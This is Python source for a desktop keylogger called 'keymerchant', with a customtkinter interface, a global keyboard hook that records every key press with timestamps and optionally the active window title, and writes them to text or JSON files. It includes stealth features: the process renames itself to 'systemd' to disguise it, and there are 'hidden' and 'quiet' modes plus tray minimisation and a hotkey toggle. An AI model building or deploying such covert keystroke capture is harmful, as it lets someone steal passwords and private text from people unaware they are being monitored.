import keyboard, json, setproctitle, sys, customtkinter, os, pystray, threading

from tkinter import *
from tkinter import filedialog
from datetime import datetime
from PIL import Image
from keymerchant_utils import Logic, GuiUtils, KmManager, Listener

# Attempt to hide process? have to check if it actually works
setproctitle.setproctitle('systemd')

# General program manager + logic handler
logics = Logic()

new_kblisten = None

# Callback function called by the keyboard.on_press() hook
def handle_event(event):
    event_data = json.loads(event.to_json())
    event_data['timestamp'] = datetime.fromtimestamp(event_data['time']).strftime('%d-%m-%y %H:%M:%S.%f')[:-3]
    print(f'{event_data['name']}\t-\t{event_data['timestamp']}')

    # Worth considering consolidating single_log_operation into this function
    single_log_operation(event_data)

km = KmManager(handle_event)

# Get data about key event from the on_press() callback handler
# If necessary, process it and log it according to the two logging types
def single_log_operation(event):
    if km.out_stream is not None:
        if km.logmode == logics.LoggingModes.TXT:
            if km.context_logging:
                from win32gui import GetWindowText, GetForegroundWindow
                km.out_stream.write(f"{f'{event['name']:<15}' + f'{'---':<10}{event['timestamp']}' + 
                    f'{'':<5}{'---':<10}{GetWindowText(GetForegroundWindow())}\n'}")
            else:
                km.out_stream.write(f"{f'{event['name']:<15}' + f'{'---':<10}{event['timestamp']}\n'}")
            # Flush stream immediately
            km.out_stream.flush()
        elif km.logmode == logics.LoggingModes.JSON:
            # Stream flushing not possible. See start_logging() function
            if km.context_logging:
                from win32gui import GetWindowText, GetForegroundWindow
                km.json_dict['KEYSTROKES'].append({'key': event['name'],
                    'timestamp': event['timestamp'], 'window': GetWindowText(GetForegroundWindow())})
            else:
                km.json_dict['KEYSTROKES'].append({'key': event['name'], 'timestamp': event['timestamp']})



def start_logging():
    global new_kblisten
    if km.start_minimize:
        minimize()
    # Change button and field states to safeguard against unexpected user behavior
    km.start_btn.configure(state = 'disabled')
    km.stop_btn.configure(state = 'normal')
    km.logmode_box.configure(state = 'disabled')

    try:
        km.logmode = logics.LoggingModes[km.logmode_box.get()]
    except KeyError:
        print(f'Invalid logging mode selected: {km.logmode_box.get()}')


    if not km.currently_listening:
        if km.logmode != logics.LoggingModes.OFF:
            # Prepare two separate timestamp formats
            start_date = datetime.now()
            # For filename
            filename = f'keymerchant_{start_date.strftime('%d-%m-%Y_%H%M%S')}'
            # For the 'title' / header inside the file
            file_intro_str = \
                f'= = = = = BEGIN KEYMERCHANT LOG - {start_date.strftime('%H:%M:%S.%f // %A, %B %d, %Y')} = = = = ='

            if km.logmode == logics.LoggingModes.TXT:
                km.out_stream = open(os.path.join(km.out_path, f'{filename}.txt')
                                        if km.out_path is not None else f'{filename}.txt', 'w')
                km.out_stream.write(f'{file_intro_str}\n\n')

            elif km.logmode == logics.LoggingModes.JSON:
                # JSON logging is NON-IMMEDIATE. The created .json file stays EMPTY
                #   until logging is STOPPED. Only then is the entire dictionary
                #   dumped at once into the file, the file flushed, and finally the
                #   stream closed.
                km.out_stream = open(os.path.join(km.out_path, f'{filename}.json')
                                        if km.out_path is not None else f'{filename}.json', 'w')

                # Prepare the json dictionary
                km.json_dict['INTRO'] = file_intro_str

        # Start the actual listener
        # km.kblisten = keyboard.on_press(lambda: handle_event())
        new_kblisten = Listener('new_kblisten', handle_event)
        new_kblisten.run()
        km.currently_listening = True

    else:
        # Handle start commands when the listener is already running
        #   (redundant since the Start button is disabled when the listener starts)
        print('Already logging')



def stop_logging():
    global new_kblisten
    if km.start_minimize:
        show_window()

    # Change button and field states to safeguard against unexpected user behavior
    km.start_btn.configure(state='normal')
    km.stop_btn.configure(state='disabled')
    km.logmode_box.configure(state='readonly')

    # Stop listener
    # keyboard.unhook(km.listener)
    # km.listener.terminate()
    new_kblisten.stop()
    km.currently_listening = False

    if km.out_stream is not None:
        outro_text = '= = = = = END KEYMERCHANT LOG = = = = ='

        if km.logmode == logics.LoggingModes.TXT:
            km.out_stream.write(f'\n{outro_text}')
        elif km.logmode == logics.LoggingModes.JSON:
            km.json_dict['OUTRO'] = outro_text

            # Dump the entire json dictionary into the file
            json.dump(km.json_dict, km.out_stream, indent = 4, ensure_ascii = False)

        # Close file
        km.out_stream.close()
        km.out_stream = None



def directory_km():
    km.out_path = filedialog.askdirectory(title = 'select log output destination')
    km.outdir_tip.text = km.out_path if (km.out_path != '' and km.out_path != tuple()) \
        else 'None selected - will output to current script directory'
    if km.out_path == ' ':
        km.out_path = None



def checkbox_handler(box_id):
    match box_id:
        case 'H':
            # quiet mode cannot be disabled when hidden mode is enabled -
            #   handle logic and boolean operations accordingly
            km.hidden_mode = not km.hidden_mode
            if km.hidden_mode:
                if not km.quiet_mode:
                    km.quietmode_chckbox.toggle()
                    km.quietmode_chckbox.configure(state='disabled')
            else:
                km.quietmode_chckbox.configure(state='normal')
                km.quietmode_chckbox.toggle()
        case 'Q':
            km.quiet_mode = not km.quiet_mode
            logics.print_handler(logics.PrintStates.OFF if km.quiet_mode else logics.PrintStates.ON)
        case 'C':
            km.context_logging = not km.context_logging
        case 'M':
            km.start_minimize = not km.start_minimize
        case _:
            print(f'Illegal argument passed to function checkbox_handler(): {box_id}')



def minimize():
    km.root.withdraw()
    image = Image.open('assets/logos/hidden_logo.png' if km.CURRENT_OS == 'win32' else 'assets/logos/hidden_logo.png')
    menu = (pystray.MenuItem('Quit', lambda: sys.exit(5)),
            pystray.MenuItem('Show', lambda: show_window()))
    km.min_icon = pystray.Icon('keymerchant', image, 'keymerchant', menu)
    # min_thread = threading.Thread(daemon = True, target = lambda: km.min_icon.run()).start()
    km.min_icon.run()



def show_window():
    km.min_icon.stop()
    km.root.after(0, km.root.deiconify)



def main():
    km.root = customtkinter.CTk()
    km.root.title('keymerchant 0.2b')
    km.root.geometry('400x350')
    km.root.resizable(width=False, height=False)
    km.root.columnconfigure(0, weight=1)
    km.root.rowconfigure(0, weight=1)
    km.root.configure(fg_color = '#0A0A0A')
    GuiUtils.center_window(km.root)

    frame = customtkinter.CTkFrame(km.root, fg_color = '#0A0A0A')
    frame.grid(column = 0, row = 0, sticky = (N, W, E, S), padx = 10, pady = 10)
    frame.columnconfigure(10, weight = 1)
    frame.rowconfigure(12, weight = 1)

    logging_modes = [mode.name for mode in logics.LoggingModes]
    gui_set = GuiUtils.Elements(frame, km.root, start_logging, stop_logging,
                                logging_modes, checkbox_handler, directory_km, minimize)

    keyboard.add_hotkey('ctrl+alt+k', lambda: start_logging() if not km.currently_listening else stop_logging())

    km.start_btn = gui_set.start_button
    km.stop_btn = gui_set.stop_button
    km.logmode_box = gui_set.logging_mode_box
    km.quietmode_chckbox = gui_set.quiet_mode_checkbox

    km.logmode_box.set(logging_modes[0])

    gui_set.program_title.grid(row = 0, column = 0, columnspan = 4, padx = 0, pady = (0, 15), sticky = 'nw')
    km.start_btn.grid(row = 1, column = 0, columnspan = 2, padx = 0, pady = (0, 5), sticky = 'nw')
    km.stop_btn.grid(row = 2, column = 0, columnspan = 2, padx = 0, pady = 0, sticky = 'w')
    gui_set.logging_mode_label.grid(row = 1, column = 10, padx = 0, pady = 0, sticky = 'e')
    km.logmode_box.grid(row = 2, column = 10, padx = 0, pady = 0, sticky = 'e')
    gui_set.bracket_label.grid(row = 1, column = 2, rowspan = 2, padx = (5, 0), pady = (5, 0), sticky = 'w')
    gui_set.hotkey_hint_label.grid(row = 1, column = 3, rowspan = 2, padx = (5, 0), pady = (5, 0), sticky = 'w')

    gui_set.hidden_mode_checkbox.grid(row = 4, column = 0, columnspan = 5, padx = 0, pady = (32, 10), sticky = 'w')
    km.quietmode_chckbox.grid(row = 6, column = 0, columnspan = 5, padx = 0, pady = (0, 10), sticky = 'w')
    gui_set.context_logging_checkbox.grid(row = 8, column = 0, columnspan = 5, padx = 0, pady = (0, 10), sticky = 'w')
    gui_set.minimization_checkbox.grid(row = 10, column = 0, columnspan = 5, padx = 0, pady = 0, sticky = 'w')

    gui_set.output_directory_button.grid(row = 4, column = 10, padx = 0, pady = (32, 0), sticky = 'ne')
    gui_set.minimize_button.grid(row = 5, column = 10, rowspan = 2, padx = 0, pady = 0, sticky = 'ne')
    gui_set.quote_label.grid(row = 0, column = 0, columnspan = 5, padx = (10, 0), pady = 0, sticky = 'sw')

    km.outdir_tip = GuiUtils.CustomTooltip(gui_set.output_directory_button,
        'none selected - will output to current script directory')
    minimize_chckbox_tip = GuiUtils.CustomTooltip(gui_set.minimization_checkbox,
            'enabled: stop logging using hotkey or show again from tray')

    # Disable context logging functionality if the program is run on a non-Windows OS
    gui_set.context_logging_checkbox.configure(state = 'disabled' if km.CURRENT_OS != 'win32' else 'normal')

    # Notify user of said restriction
    context_logging_tooltip = GuiUtils.CustomTooltip(gui_set.context_logging_checkbox,
    "thanks to modern Linux restrictions, window context logging is only available on Windows")

    # Set app icon according to OS
    km.root.iconbitmap('assets/logos/lavender.ico' if km.CURRENT_OS == 'winassets32' else '@assets/logos/lavender.xbm')

    km.root.mainloop()



if __name__ == "__main__":
    main()